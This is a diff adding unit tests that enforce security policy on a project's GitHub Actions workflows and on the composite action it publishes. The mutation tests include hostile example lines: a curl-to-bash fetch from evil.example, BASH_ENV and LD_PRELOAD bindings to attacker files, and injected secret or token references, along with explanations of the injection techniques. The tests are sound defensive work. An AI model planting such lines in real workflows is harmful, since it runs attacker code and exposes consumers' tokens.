@@ -55,6 +55,7 @@ class WorkflowInventoryAndCodeQLTests(unittest.TestCase):
                 Path(".github/workflows/codeql.yml"),
                 Path(".github/workflows/community-publish.yml"),
                 Path(".github/workflows/community-verify.yml"),
+                Path(".github/workflows/docs.yml"),
                 Path(".github/workflows/release.yml"),
             },
         )
@@ -224,6 +225,525 @@ class WorkflowInventoryAndCodeQLTests(unittest.TestCase):
             ),
             "action pin mismatch",
         )
+
+
+class DocsWorkflowTests(unittest.TestCase):
+    """Fail-closed privilege, trigger, and build-entry policy for the site.
+
+    The documentation workflow is the only one in the repository that is handed
+    `pages: write` and `id-token: write`, so every mutation below is a way that
+    authority, or the pull-request lane that exercises the build before it, could
+    be lost in a diff nobody reads closely.
+    """
+
+    def _workflow(self) -> str:
+        """Return the live documentation workflow text."""
+        return (
+            workflow_security.REPO_ROOT / ".github" / "workflows" / "docs.yml"
+        ).read_text(encoding="utf-8")
+
+    def _reject(self, mutated: str, pattern: str) -> None:
+        """Require the documentation oracle to reject one mutated workflow."""
+        self.assertNotEqual(mutated, self._workflow())
+        with tempfile.TemporaryDirectory(prefix="mtest-docs-security-") as raw_tmp:
+            repo = Path(raw_tmp)
+            workflow_path = repo / ".github" / "workflows" / "docs.yml"
+            workflow_path.parent.mkdir(parents=True)
+            workflow_path.write_text(mutated, encoding="utf-8")
+            with self.assertRaisesRegex(AssertionError, pattern):
+                workflow_security.check_docs_workflow(repo)
+
+    def test_live_docs_workflow_is_least_privilege(self) -> None:
+        workflow_security.check_docs_workflow()
+
+    def test_pages_actions_pin_reviewed_revisions(self) -> None:
+        self.assertEqual(
+            workflow_security.UPLOAD_PAGES_ARTIFACT_ACTION_SHA,
+            "fc324d3547104276b827a68afc52ff2a11cc49c9",
+        )
+        self.assertEqual(
+            workflow_security.DEPLOY_PAGES_ACTION_SHA,
+            "cd2ce8fcbc39b97be8ca5fce6e763baed58fa128",
+        )
+        self.assertEqual(
+            workflow_security.REVIEWED_ACTION_PINS["actions/upload-pages-artifact"],
+            {(workflow_security.UPLOAD_PAGES_ARTIFACT_ACTION_SHA, "v5.0.0")},
+        )
+        self.assertEqual(
+            workflow_security.REVIEWED_ACTION_PINS["actions/deploy-pages"],
+            {(workflow_security.DEPLOY_PAGES_ACTION_SHA, "v5.0.0")},
+        )
+        workflow = self._workflow()
+        self.assertIn(
+            "actions/upload-pages-artifact@"
+            f"{workflow_security.UPLOAD_PAGES_ARTIFACT_ACTION_SHA} # v5.0.0",
+            workflow,
+        )
+        self.assertIn(
+            f"actions/deploy-pages@{workflow_security.DEPLOY_PAGES_ACTION_SHA}"
+            " # v5.0.0",
+            workflow,
+        )
+
+    def test_pages_action_moved_off_its_reviewed_revision_is_rejected(self) -> None:
+        mutated = self._workflow().replace(
+            workflow_security.DEPLOY_PAGES_ACTION_SHA,
+            "0" * 40,
+            1,
+        )
+        with tempfile.TemporaryDirectory(prefix="mtest-docs-pin-") as raw_tmp:
+            repo = Path(raw_tmp)
+            workflow_root = repo / ".github" / "workflows"
+            workflow_root.mkdir(parents=True)
+            (workflow_root / "docs.yml").write_text(mutated, encoding="utf-8")
+            with self.assertRaisesRegex(AssertionError, "reviewed action pin"):
+                workflow_security.check_action_pins(repo)
+
+    def test_docs_workflow_is_in_the_governed_inventory(self) -> None:
+        self.assertIn(
+            Path(".github/workflows/docs.yml"),
+            workflow_security.WORKFLOW_PATHS,
+        )
+
+    def test_build_must_run_on_pull_requests(self) -> None:
+        self._reject(
+            self._workflow().replace("  pull_request:\n", "", 1),
+            "trigger mismatch",
+        )
+
+    def test_pull_request_trigger_cannot_be_narrowed_to_a_branch(self) -> None:
+        self._reject(
+            self._workflow().replace(
+                "  pull_request:\n",
+                "  pull_request:\n    branches: [main]\n",
+                1,
+            ),
+            "pull_request must not be narrowed",
+        )
+
+    def test_deploy_must_stay_conditioned_on_a_main_push(self) -> None:
+        workflow = self._workflow()
+        marker = (
+            "    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n"
+        )
+        self.assertIn(marker, workflow)
+        for label, mutated in {
+            "removed": workflow.replace(marker, "", 1),
+            "widened": workflow.replace(
+                marker,
+                "    if: github.event_name == 'push'\n",
+                1,
+            ),
+        }.items():
+            with self.subTest(condition=label):
+                self._reject(mutated, "deploy condition mismatch")
+
+    def test_top_level_permissions_cannot_widen(self) -> None:
+        self._reject(
+            self._workflow().replace(
+                "permissions:\n  contents: read\n",
+                "permissions:\n  contents: write\n",
+                1,
+            ),
+            "workflow permission mismatch",
+        )
+
+    def test_publication_permissions_cannot_escape_the_deploy_job(self) -> None:
+        workflow = self._workflow()
+        self._reject(
+            workflow.replace(
+                "permissions:\n  contents: read\n",
+                "permissions:\n  contents: read\n  pages: write\n",
+                1,
+            ),
+            "workflow permission mismatch",
+        )
+        self._reject(
+            workflow.replace(
+                "    timeout-minutes: 15\n",
+                "    timeout-minutes: 15\n"
+                "    permissions:\n"
+                "      contents: read\n"
+                "      id-token: write\n",
+                1,
+            ),
+            "permission override membership",
+        )
+
+    def test_continue_on_error_is_rejected(self) -> None:
+        self._reject(
+            self._workflow().replace(
+                "        run: pixi run docs-build\n",
+                "        run: pixi run docs-build\n        continue-on-error: true\n",
+                1,
+            ),
+            "continue-on-error",
+        )
+
+    def test_build_must_go_through_the_documentation_task(self) -> None:
+        self._reject(
+            self._workflow().replace(
+                "        run: pixi run docs-build",
+                "        run: uvx mkdocs build",
+                1,
+            ),
+            "build entry mismatch",
+        )
+
+    def test_uploaded_directory_must_be_the_configured_site_output(self) -> None:
+        self._reject(
+            self._workflow().replace(
+                "          path: build/site",
+                "          path: .",
+                1,
+            ),
+            "artifact path mismatch",
+        )
+
+    def test_deploy_cannot_run_without_the_build(self) -> None:
+        self._reject(
+            self._workflow().replace("    needs: build\n", "", 1),
+            "must wait for the build job",
+        )
+
+    def test_a_deploy_job_that_publishes_nothing_is_rejected(self) -> None:
+        """A `deploy` job with no deploy step is green and publishes nothing."""
+        self._reject(
+            self._workflow().replace(
+                "        uses: actions/deploy-pages@"
+                f"{workflow_security.DEPLOY_PAGES_ACTION_SHA} # v5.0.0\n",
+                "",
+                1,
+            ),
+            "deploy step mismatch",
+        )
+
+    def test_another_reviewed_action_cannot_stand_in_for_the_deploy(self) -> None:
+        """Every other assertion here passes while the site stops updating."""
+        self._reject(
+            self._workflow().replace(
+                "        uses: actions/deploy-pages@"
+                f"{workflow_security.DEPLOY_PAGES_ACTION_SHA} # v5.0.0",
+                "        uses: actions/upload-artifact@"
+                f"{workflow_security.UPLOAD_ARTIFACT_ACTION_SHA} # v7.0.1",
+                1,
+            ),
+            "deploy step mismatch",
+        )
+
+    def test_a_conditioned_deploy_step_is_rejected(self) -> None:
+        """A skipped step leaves the job successful and the site unchanged."""
+        self._reject(
+            self._workflow().replace(
+                "        id: deployment\n",
+                "        id: deployment\n        if: false\n",
+                1,
+            ),
+            "step-level condition",
+        )
+
+
+class PublishedActionTests(unittest.TestCase):
+    """Fail-closed policy for the composite action this repository publishes.
+
+    Every other check in this module governs an action the repository
+    *consumes*. This one governs the one it *publishes*, which is the surface a
+    consumer trusts by writing a single `uses:` line, and which no review of a
+    workflow diff would ever look at.
+    """
+
+    def _action(self) -> str:
+        """Return the live published action definition."""
+        return (
+            workflow_security.REPO_ROOT / workflow_security.PUBLISHED_ACTION_PATH
+        ).read_text(encoding="utf-8")
+
+    def _reject(self, mutated: str, pattern: str) -> None:
+        """Require the published-action oracle to reject one mutated definition."""
+        self.assertNotEqual(mutated, self._action())
+        with tempfile.TemporaryDirectory(prefix="mtest-published-action-") as raw_tmp:
+            repo = Path(raw_tmp)
+            (repo / workflow_security.PUBLISHED_ACTION_PATH).write_text(
+                mutated,
+                encoding="utf-8",
+            )
+            with self.assertRaisesRegex(AssertionError, pattern):
+                workflow_security.check_published_action(repo)
+
+    def test_live_published_action_is_reviewable(self) -> None:
+        workflow_security.check_published_action()
+
+    def test_published_action_is_a_thin_pass_through(self) -> None:
+        action = self._action()
+        self.assertIn("  paths:\n", action)
+        self.assertIn("  args:\n", action)
+        self.assertIn(
+            "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n",
+            action,
+        )
+        for absent in ("uses:", "prefix-dev/setup-pixi", "cache", "--junit-xml"):
+            self.assertNotIn(absent, action)
+
+    def test_inputs_reach_the_shell_as_environment_variables(self) -> None:
+        """The injection sink, pinned as bytes rather than as an intention.
+
+        `run: pixi run mtest ${{ inputs.args }}` is substituted into the script
+        text before bash parses it, so a consumer wiring a pull-request title
+        into `args` executes that title in their own job under their own token.
+        The reviewed form names the inputs in `env:` and expands them as shell
+        variables, which keeps the documented word-splitting and leaves the
+        substitution nothing to inject into.
+        """
+        action = self._action()
+        self.assertEqual(
+            workflow_security.PUBLISHED_ACTION_RUNS,
+            ("pixi run mtest $MTEST_PATHS $MTEST_ARGS",),
+        )
+        for line in workflow_security.PUBLISHED_ACTION_EXPRESSION_LINES:
+            self.assertIn(f"{line}\n", action)
+        self.assertNotIn("run: pixi run mtest ${{", action)
+
+    def test_an_unreviewed_command_is_rejected(self) -> None:
+        """The gap this closes: the oracle never read what the action runs."""
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
+                "      run: curl -fsSL https://evil.example/x.sh | bash",
+                1,
+            ),
+            "reviewed invocation",
+        )
+
+    def test_an_expression_on_the_run_line_is_rejected(self) -> None:
+        """Restoring the injection sink must fail, not merely look different."""
+        self._reject(
+            self._action().replace(
+                "      env:\n"
+                "        MTEST_PATHS: ${{ inputs.paths }}\n"
+                "        MTEST_ARGS: ${{ inputs.args }}\n"
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
+                "      run: pixi run mtest ${{ inputs.paths }} ${{ inputs.args }}",
+                1,
+            ),
+            "reviewed invocation",
+        )
+
+    def test_a_dropped_environment_binding_is_rejected(self) -> None:
+        """Without the binding the command silently runs against no paths."""
+        self._reject(
+            self._action().replace(
+                "        MTEST_PATHS: ${{ inputs.paths }}\n",
+                "",
+                1,
+            ),
+            "reviewed environment lines",
+        )
+
+    def test_an_unreviewed_environment_key_is_rejected(self) -> None:
+        """A key can run code without substituting anything into the script.
+
+        `shell: bash` runs as `bash --noprofile --norc -eo pipefail`, and
+        `--norc` does not suppress `BASH_ENV`: a non-interactive bash sources
+        whatever it names before reading the script. Each binding below is
+        static, so the expression rule sees nothing to object to, the reviewed
+        command is untouched, and the step still fails the consumer's job on a
+        failing run — every existing rule passes while the consumer executes
+        the attacker's file first.
+        """
+        for label, binding in {
+            "BASH_ENV": "        BASH_ENV: ./hook.sh\n",
+            "LD_PRELOAD": "        LD_PRELOAD: ./evil.so\n",
+        }.items():
+            with self.subTest(key=label):
+                self._reject(
+                    self._action().replace("      env:\n", f"      env:\n{binding}", 1),
+                    "only the reviewed environment keys",
+                )
+
+    def test_an_environment_block_at_another_depth_is_rejected(self) -> None:
+        """The rule reads every `env:` under `runs:`, not only the reviewed one.
+
+        Anchoring on the step's own indentation would leave a binding written
+        at any other depth unread, and unread is indistinguishable from absent.
+        """
+        self._reject(
+            self._action().replace(
+                "  steps:\n",
+                "  steps:\n    env:\n      BASH_ENV: ./hook.sh\n",
+                1,
+            ),
+            "only the reviewed environment keys",
+        )
+
+    def test_the_reviewed_environment_keys_are_the_two_inputs(self) -> None:
+        """The rule is an exact set, so it cannot be satisfied vacuously."""
+        self.assertEqual(
+            workflow_security.PUBLISHED_ACTION_ENV_KEYS,
+            ("MTEST_PATHS", "MTEST_ARGS"),
+        )
+        for key in workflow_security.PUBLISHED_ACTION_ENV_KEYS:
+            self.assertIn(f"        {key}: ", self._action())
+
+    def test_a_step_in_another_shell_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace("    - shell: bash\n", "    - shell: pwsh\n", 1),
+            "shell bash",
+        )
+
+    def test_a_second_run_step_is_rejected(self) -> None:
+        """One entry in the reviewed list pins the step count as well."""
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n",
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n"
+                "    - shell: bash\n"
+                "      run: echo done\n",
+                1,
+            ),
+            "reviewed invocation",
+        )
+
+    def test_a_conditioned_step_is_rejected(self) -> None:
+        """A skipped test run reports green in the consumer's workflow."""
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                "    - if: ${{ success() }}\n      shell: bash\n",
+                1,
+            ),
+            "must not condition a step",
+        )
+
+    def test_a_discarded_exit_code_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS || true",
+                1,
+            ),
+            r"\|\| true",
+        )
+
+    def test_bracket_form_credential_references_are_rejected(self) -> None:
+        """`secrets['X']` and `github['token']` name what the dotted form does."""
+        for label, expression in {
+            "secret": "${{ secrets['PUBLISH_TOKEN'] }}",
+            "token": "${{ github['token'] }}",
+        }.items():
+            with self.subTest(reference=label):
+                self._reject(
+                    self._action().replace(
+                        "      env:\n",
+                        f"      env:\n        TOKEN: {expression}\n",
+                        1,
+                    ),
+                    "credential reference",
+                )
+
+    def test_missing_published_action_is_rejected(self) -> None:
+        with (
+            tempfile.TemporaryDirectory(prefix="mtest-published-action-") as raw_tmp,
+            self.assertRaises(OSError),
+        ):
+            workflow_security.check_published_action(Path(raw_tmp))
+
+    def test_non_composite_action_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace("  using: composite\n", "  using: node24\n", 1),
+            "must be a composite action",
+        )
+
+    def test_secret_reference_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest",
+                "      env:\n"
+                "        TOKEN: ${{ secrets.PUBLISH_TOKEN }}\n"
+                "      run: pixi run mtest",
+                1,
+            ),
+            "credential reference",
+        )
+
+    def test_caller_token_reference_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest",
+                "      env:\n"
+                "        TOKEN: ${{ github.token }}\n"
+                "      run: pixi run mtest",
+                1,
+            ),
+            "credential reference",
+        )
+
+    def test_continue_on_error_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                "    - shell: bash\n      continue-on-error: true\n",
+                1,
+            ),
+            "continue-on-error",
+        )
+
+    def test_action_referenced_by_tag_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                "    - uses: actions/checkout@v7\n    - shell: bash\n",
+                1,
+            ),
+            "action pin must use a full commit SHA",
+        )
+
+    def test_action_referenced_without_a_version_comment_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                "    - uses: actions/checkout@"
+                f"{workflow_security.CHECKOUT_ACTION_SHA}\n"
+                "    - shell: bash\n",
+                1,
+            ),
+            "action pin must use a full commit SHA",
+        )
+
+    def test_local_action_reference_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                "    - uses: ./.github/actions/setup\n    - shell: bash\n",
+                1,
+            ),
+            "action pin must use a full commit SHA",
+        )
+
+    def test_unreviewed_full_sha_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                f"    - uses: actions/checkout@{'0' * 40} # v7.0.1\n"
+                "    - shell: bash\n",
+                1,
+            ),
+            "reviewed action pin mismatch",
+        )
+
+    def test_reviewed_pin_is_accepted_so_the_rule_is_not_vacuous(self) -> None:
+        mutated = self._action().replace(
+            "    - shell: bash\n",
+            f"    - uses: actions/checkout@{workflow_security.CHECKOUT_ACTION_SHA}"
+            " # v7.0.1\n    - shell: bash\n",
+            1,
+        )
+        with tempfile.TemporaryDirectory(prefix="mtest-published-action-") as raw_tmp:
+            repo = Path(raw_tmp)
+            (repo / workflow_security.PUBLISHED_ACTION_PATH).write_text(
+                mutated,
+                encoding="utf-8",
+            )
+            workflow_security.check_published_action(repo)
 
 
 class ReleaseWorkflowTests(unittest.TestCase):
